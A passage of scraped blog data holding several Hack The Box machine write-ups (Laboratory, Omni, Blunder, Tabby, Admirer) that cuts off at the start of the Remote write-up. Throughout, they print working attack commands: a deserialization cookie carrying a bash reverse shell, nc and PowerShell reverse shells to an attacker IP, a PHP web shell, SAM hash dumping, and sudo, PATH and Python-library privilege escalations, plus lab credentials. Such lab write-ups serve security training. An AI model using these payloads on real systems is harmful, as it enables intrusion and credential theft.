BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNjY2NiAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--340332f213dbdec0821e3f4a8d7e4f3279accbb9 =\u0026gt; nil Send a request according to the post └─$ curl -vvv -k \u0026#39;https://git.laboratory.htb/users/sign_in\u0026#39; -b \u0026#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNjY2NiAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--340332f213dbdec0821e3f4a8d7e4f3279accbb9\u0026#34; * Trying 10.10.10.216:443... * Connected to git.laboratory.htb (10.10.10.216) port 443 (#0) * ALPN: offers h2,http/1.1 * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 * ALPN: server accepted http/1.1 * Server certificate: * subject: CN=laboratory.htb * start date: Jul 5 10:39:28 2020 GMT * expire date: Mar 3 10:39:28 2024 GMT * issuer: CN=laboratory.htb * SSL certificate verify result: self-signed certificate (18), continuing anyway. * using HTTP/1.1 \u0026gt; GET /users/sign_in HTTP/1.1 \u0026gt; Host: git.laboratory.htb \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; Cookie: experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNjY2NiAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--340332f213dbdec0821e3f4a8d7e4f3279accbb9 \u0026gt; * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * old SSL session ID is stale, removing Get your foothold └─$ nc -lvnp 6666 listening on [any] 6666 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.10.216] 43024 bash: cannot set terminal process group (402): Inappropriate ioctl for device bash: no job control in this shell git@git:~/gitlab-rails/working$ User We are inside the container based on our enumeration .dockerenv and empty /home Running deepce had no success So let\u0026rsquo;s open gitlab-rails console and make our user an admin to see if there are other projects Cheetshee git@git:~/gitlab-rails/working$ gitlab-rails console -------------------------------------------------------------------------------- GitLab: 12.8.1 (d18b43a5f5a) FOSS GitLab Shell: 11.0.0 PostgreSQL: 10.12 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.2) irb(main):001:0\u0026gt; user = User.find_by(username: \u0026#34;test\u0026#34;) user = User.find_by(username: \u0026#34;test\u0026#34;) =\u0026gt; #\u0026lt;User id:5 @test\u0026gt; irb(main):002:0\u0026gt; user.admin = TRUE user.admin = TRUE (irb):2: warning: constant ::TRUE is deprecated =\u0026gt; true irb(main):003:0\u0026gt; user.save! user.save! =\u0026gt; true irb(main):004:0\u0026gt; And we find another project with id_rsa in it Let\u0026rsquo;s connect via ssh Root Now let\u0026rsquo;s enumerate the box If we run linpeas or look for SUID files we see an interesting binary 7838 20 -rwsr-xr-x 1 root dexter 16720 Aug 28 2020 /usr/local/bin/docker-security Let\u0026rsquo;s run ltrace dexter@laboratory:~$ ltrace /usr/local/bin/docker-security setuid(0) = -1 setgid(0) = -1 system(\u0026#34;chmod 700 /usr/bin/docker\u0026#34;chmod: changing permissions of \u0026#39;/usr/bin/docker\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 system(\u0026#34;chmod 660 /var/run/docker.sock\u0026#34;chmod: changing permissions of \u0026#39;/var/run/docker.sock\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 +++ exited (status 0) +++ So suid binaries doesn\u0026rsquo;t have concept of the secure path So we can perform path injection Let\u0026rsquo;s create a script that run bash Make it executable Change PATH variable by adding current directory (which stores our chmod) Run suid binary And get our root shell ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/laboratory/images/laboratory.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/laboratory/","summary":"Laboratory Enumeration Nmap └─$ nmap -Pn -sC -sV 10.10.10.216 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 18:25 BST Nmap scan report for 10.10.10.216 (10.10.10.216) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25ba648f799d5d95972c1bb25e9b550d (RSA) |_ 256 7720ffe946c068921a0b2129d153aa87 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.","tags":["HTB","gitlab","vhosts","cve-2020-10977","deserialization","hackerone","docker","ruby","irb","suid","path-hijack"],"title":"[HTB] Machine: Laboratory"},{"categories":null,"contents":"Omni Enumeration nmap └─$ nmap -p135,5985,8080,29817,29819,29820 -Pn 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.10.10.204 (10.10.10.204) Host is up (0.16s latency). PORT STATE SERVICE 135/tcp open msrpc 5985/tcp open wsman 8080/tcp open http-proxy 29817/tcp open unknown 29819/tcp open unknown 29820/tcp open unknown └─$ nmap -p135,5985,8080,29817,29819,29820 -Pn -sC -sV 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.10.10.204 (10.10.10.204) Host is up (0.14s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open upnp Microsoft IIS httpd |_http-server-header: Microsoft-HTTPAPI/2.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-title: Site doesn\u0026#39;t have a title. 29817/tcp open unknown 29819/tcp open arcserve ARCserve Discovery 29820/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port29820-TCP:V=7.93%I=7%D=7/5%Time=64A5AFBD%P=x86_64-pc-linux-gnu%r(NU SF:LL,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(GenericLines,10,\u0026#34;\\ SF:*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(Help,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04 SF:G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(JavaRMI,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc SF:9}\\xc8O\\x12\u0026#34;); Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 78.05 seconds Port 8080 rpcclient Other open ports indicate that it uses Windows IOT Core https://social.msdn.microsoft.com/Forums/vstudio/en-US/75314423-de13-4eff-bd15-0fec8b9c1da4/ports-open?forum=WindowsIoT https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf Foothold Googling more about the ports revealed the following github page indicating Sirep protocol Check the docs for more info about the We can test the exploit Now let\u0026rsquo;s try getting the reverse shell I tried running powershell -c iex(new-object net.webclient).downloadstring(\u0026quot;http://10.10.16.12:8000/shell.ps1\u0026quot;), which failed So I tried simply downloading the shell using Invoke-WebRequest which is worked But it is better to download it to the writable folder, for example to C:\\Windows\\System32\\spool\\drivers\\color I tried running powershell\u0026rsquo;s versions of reverse shell, had no success So I used nc: /c c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.16.12 6666 User If we check the c: drive, we have a data folder No users c:\\Users But there are users in c:\\Data\\Users\\ If we check the folders, we can the flags but they are PSCredential files We need a passwords to decrypt them Since we are SYSTEM we can dump the SAM hashes Start smbserver on attack box: impacket-smbserver share . -smb2support -username pentest -password pentest Mount the share to the box: net use \\\\10.10.16.12\\share /u:pentest pentest Dump the hives to the share: reg save HKLM\\sam \\\\10.10.16.12\\share\\sam reg save HKLM\\system \\\\10.10.16.12\\share\\system reg save HKLM\\security \\\\10.10.16.12\\share\\security Dump the hashes: impacket-secretsdump -sam sam -security security -system system LOCAL Crack the app user\u0026rsquo;s hash: hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt app:mesh5143 Creds work to access the page on port 8080 Get reverse shell Now we can decrypt the flag using Import-CliXml (Import-CliXml -Path user.txt).GetNetworkCredential().Password Root We find interesting files inside app\u0026rsquo;s folder: hardening.txt and iot-admin.xml iot-admin.xml is also PSCredential file We can decrypt the same way as the flag: (Import-CliXml -Path iot-admin.xml).GetNetworkCredential() | fl administrator:_1nt3rn37ofTh1nGz Let\u0026rsquo;s get reverse shell the same way as before via port 8080 (Import-CliXml -Path root.txt).GetNetworkCredential().Password ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/omni/images/omni.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/omni/","summary":"Omni Enumeration nmap └─$ nmap -p135,5985,8080,29817,29819,29820 -Pn 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.10.10.204 (10.10.10.204) Host is up (0.16s latency). PORT STATE SERVICE 135/tcp open msrpc 5985/tcp open wsman 8080/tcp open http-proxy 29817/tcp open unknown 29819/tcp open unknown 29820/tcp open unknown └─$ nmap -p135,5985,8080,29817,29819,29820 -Pn -sC -sV 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.","tags":["HTB","windows-iot-core","powershell-credentials","sirep","secretsdump","windows-device-portal"],"title":"[HTB] Machine: Omni"},{"categories":null,"contents":"Blunder Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.191 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 12:05 BST Nmap scan report for 10.10.10.191 (10.10.10.191) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Blunder | A blunder of interesting facts |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.64 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php,html =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.191 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2023/07/01 14:00:27 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /about (Status: 200) [Size: 3281] /.php (Status: 403) [Size: 277] /0 (Status: 200) [Size: 7562] /admin (Status: 301) [Size: 0] [--\u0026gt; http://10.10.10.191/admin/] /install.php (Status: 200) [Size: 30] /robots.txt (Status: 200) [Size: 22] /todo.txt (Status: 200) [Size: 118] /usb (Status: 200) [Size: 3960] /LICENSE (Status: 200) [Size: 1083] Interesting paths Foothold Searchsploit We know from the note that there is a user named fergus Need to find version of the cms We can assume it\u0026rsquo;s version is 3.9.2 Let\u0026rsquo;s check an exploit for credential bruteforcing So I ran poc with rockyou wordlist, but no success Then I used cewl to create a wordlist from the webserver cewl http://10.10.10.191 \u0026gt; passwd.list Then I started the exploit fergus:RolandDeschain It seems that Bludit also has directory traversal vulnerability Let\u0026rsquo;s run that exploit Prepare payloads echo '\u0026lt;?php system($_REQUEST[\u0026quot;cmd\u0026quot;]); ?\u0026gt;' \u0026gt; evil.png echo \u0026quot;RewriteEngine off\u0026quot; \u0026gt; .htaccess echo \u0026quot;AddType application/x-httpd-php .png\u0026quot; \u0026gt;\u0026gt; .htaccess Rev shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.7 6666 \u0026gt;/tmp/f URL encoded:rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.7%206666%20%3E%2Ftmp%2Ff User Enumeration We can start with linpeas Or Start with /var/www Let\u0026rsquo;s search for files with password We found 2 users.php files for 3.10.0a and 3.9.2 versions We see a password for Hugo, which is a user on the box Crack the hash and try su hugo:Password120 Root Start with sudo -l We can run sudo as any user except root Let\u0026rsquo;s check the version just in case We have a bypass for this specific case sudo -u#-1 /bin/bash ","date":"July 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/blunder/images/blunder.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/blunder/","summary":"Blunder Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.191 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 12:05 BST Nmap scan report for 10.10.10.191 (10.10.10.191) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Blunder | A blunder of interesting facts |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","ubuntu","bludit","cms","searchsploit","github","cewl","bruteforce","python","upload","filter","crackstation","cve-2019-14287","sudo","htaccess"],"title":"[HTB] Machine: Blunder"},{"categories":null,"contents":"Tabby Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 16:48 BST Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 453c341435562395d6834e26dec65bd9 (RSA) | 256 89793a9c88b05cce4b79b102234b44a6 (ECDSA) |_ 256 1ee7b955dd258f7256e88e65d519b08d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.36 seconds Web Server and port 8080 gobuster └─$ gobuster dir -u http://megahosting.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://megahosting.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/01 17:16:46 Starting gobuster in directory enumeration mode =============================================================== /news.php (Status: 200) [Size: 0] /files (Status: 301) [Size: 318] [--\u0026gt; http://megahosting.htb/files/] /index.php (Status: 200) [Size: 14175] /.php (Status: 403) [Size: 280] /assets (Status: 301) [Size: 319] [--\u0026gt; http://megahosting.htb/assets/] /Readme.txt (Status: 200) [Size: 1574] /.php (Status: 403) [Size: 280] Foothold LFI If we scan through a web server, we will find a /news.php?file= path We can try checking for LFI, which actually works According to the message from port 8080, the file with users should be etc/tomcat9/tomcat-users.xml Which returns nothing if we try to curl it If we google a bit, we find that Ubuntu might store the file in /usr/share/tomcat9/etc/ tomcat:$3cureP4s5w0rd123! 403 for accessing /manager But we have access to /host-manager But we have access to /manager/text based on manager-script permission from tomcat-users.xml - Commands So msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.7 -f war -o shell.war LPORT=6666 curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/revshell --upload-file shell.war Launch listener and then curl http://10.10.10.194:8080/revshell User We saw from LFI that we have a user ash So let\u0026rsquo;s enumerate the box We found a backup file which belongs to ash I downloaded the file to my box cat 16162020_backup.zip | nc 10.10.16.7 7777 nc -lvnp 7777 \u0026gt; backup.zip Check with md5sum for corruptions The archive is protected with password, so I used john to crack it: admin@it I found nothing inside the archive But luckily ash reused password Root From the linpeas out I saw that ash was in adm and lxd groups Let\u0026rsquo;s use the following post Run these instructions on attack box #Install requirements sudo apt update sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools #Clone repo git clone https://github.com/lxc/distrobuilder #Make distrobuilder cd distrobuilder make #Prepare the creation of alpine mkdir -p $HOME/ContainerImages/alpine/ cd $HOME/ContainerImages/alpine/ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml #Create the container sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18 After running those we will have 2 new files, which we have to upload to target box I needed to move uploaded files to home folder since I couldn\u0026rsquo;t import the image Then I followed the instructions from the link Rooted lxc start privesc lxc exec privesc /bin/sh [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted ","date":"July 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/tabby/images/tabby.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/tabby/","summary":"Tabby Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 16:48 BST Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 453c341435562395d6834e26dec65bd9 (RSA) | 256 89793a9c88b05cce4b79b102234b44a6 (ECDSA) |_ 256 1ee7b955dd258f7256e88e65d519b08d (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","lfi","php","tomcat","host-manager","tomcat-manager","war","msfvenom","zip2john","john","hashcat","penglab","lxc","lxd","reverse-engineering"],"title":"[HTB] Machine: Tabby"},{"categories":null,"contents":"Admirer Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.187 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 18:30 BST Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a71e92163699dcbdd84021a2397e1b9 (RSA) | 256 c595b6214d46a425557a873e19a8e702 (ECDSA) |_ 256 d02dddd05c42f87b315abe57c4a9a756 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.187 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.187 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/03 18:33:05 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.187/assets/] /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 6051] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.187/images/] /robots.txt (Status: 200) [Size: 138] Nothing on FTP Foothold If we check robots.txt we find admin-dir and possible username waldo But we can\u0026rsquo;t visit that page Let\u0026rsquo;s gobuster the admin-dir path Just like it was stated in the robots.txt └─$ gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.187/admin-dir [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/07/03 18:37:24 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /contacts.txt (Status: 200) [Size: 350] /.php (Status: 403) [Size: 277] /credentials.txt (Status: 200) [Size: 136] Let\u0026rsquo;s curl those endpoints Creds didn\u0026rsquo;t work for ssh, but work for ftp Let\u0026rsquo;s download files Start checking the files index.php has creds, but they don\u0026rsquo;t work neither for ssh nor ftp We also have a new directory /utility-scripts Another pair of creds, which don\u0026rsquo;t work Tried gobuster the directory, nothing was found Digging through google resulted in Adminer Considering the name of the box Admirer and db_admin file in /utility-scripts could be a viable path From the dump.sql we know that the admirerdb is the database If we try to connect to database using the creds found, we have no success We can make Adminer connect to our database Let\u0026rsquo;s configure and start mysql Connect to database for additional configuration The following [post] shows how to fix the issue: Host '10.10.10.187' is not allowed to connect to this MariaDB server And we are in This blog shows how we can get local file access via Adminer I tried loading /etc/passwd, but no success Then I remembered that waldo had hardcoded creds in index.php, so I tried loading them. The creds were different from the ones that we had from ftp backup waldo:\u0026amp;\u0026lt;h5b~yK3F#{PaPB\u0026amp;dA}{H\u0026gt; Let\u0026rsquo;s connect to ssh Root Let\u0026rsquo;s check sudo rights There is a SETENV option that I never seen before If we check man page ...if SETENV has been set for a command, the user may disable the env_reset option from the command line via the -E option... We have env_reset ...By default, the env_reset option is enabled. This causes commands to beexecuted with a new, minimal environment.... And secure_path ...secure_path Path used for every command run from sudo. If you don’t trust the people running sudo to have a sane PATH environment variable you may want to use this... It implies that we should abuse environmental variables So let\u0026rsquo;s check the scripts We have admin_task.sh That handles the user input and performs the backup of specific files/directories based on the option chosen And backup.py that use make_archive function from shutil and archives /var/www/html directory The script is used in option 6 We can try to exploit backup.py (option 6 in the admin_tasks.sh) by changing PYTHONPATH and pass it sudo Currently PYTHONPATH is empty Setting it, will make python to look for modules in the current directory, then in the directory that we defined But PYTHONPATH is in the sudo\u0026rsquo;s default table of \u0026ldquo;bad\u0026rdquo; variables Yet there is a way to bypass it which is described here We also need to find a writable directory where we can work We can use /var/tmp Let\u0026rsquo;s create a python script shutil.py with a make_archive in /var/tmp I decided to copy /bin/bash and set it owned by root and SUID. Let\u0026rsquo;s run the script sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6 Run our bash file and get the flag ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/admirer/images/admirer.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/admirer/","summary":"Admirer Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.187 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 18:30 BST Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a71e92163699dcbdd84021a2397e1b9 (RSA) | 256 c595b6214d46a425557a873e19a8e702 (ECDSA) |_ 256 d02dddd05c42f87b315abe57c4a9a756 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","path-hijack","mysql","python-library-hijack","adminer","sudo"],"title":"[HTB] Machine: Admirer"},{"categories":null,"contents":"Remote Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.180 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 18:25 BST Nmap scan report for 10.10.10.180 (10.10.10.180) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -31s | smb2-time: | date: 2023-07-02T17:26:07 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 198.64 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.180 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx --no-error 